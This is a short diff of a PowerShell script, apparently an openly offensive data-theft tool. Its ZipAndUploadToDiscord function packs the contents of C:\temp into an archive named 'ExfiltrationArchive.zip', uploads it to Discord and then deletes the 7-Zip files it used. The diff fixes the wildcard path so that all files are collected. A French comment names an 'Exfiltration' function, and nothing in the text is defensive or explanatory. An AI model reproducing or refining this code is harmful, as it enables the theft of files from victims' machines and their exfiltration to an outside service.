@@ -57,7 +57,7 @@ function ZipAndUploadToDiscord {
     Expand-Archive -Path .\7z.zip -DestinationPath .\7z -Force
 
     # Create a zip archive using 7-Zip
-    .\7z\7za.exe a -tzip "C:\temp\ExfiltrationArchive.zip" "C:\temp*" -r
+    .\7z\7za.exe a -tzip "C:\temp\ExfiltrationArchive.zip" "C:\temp\*" -r
 
     # Call Upload-Discord to send the zip archive to Discord
     Upload-Discord -file C:\temp\ExfiltrationArchive.zip -text "Exfiltration Archive :"
@@ -65,6 +65,7 @@ function ZipAndUploadToDiscord {
     # Cleanup: Remove 7-Zip files
     Remove-Item -Path .\7z.zip, .\7z -Recurse -Force
 }
+
 
 
 # Créer un scriptblock pour la fonction Exfiltration
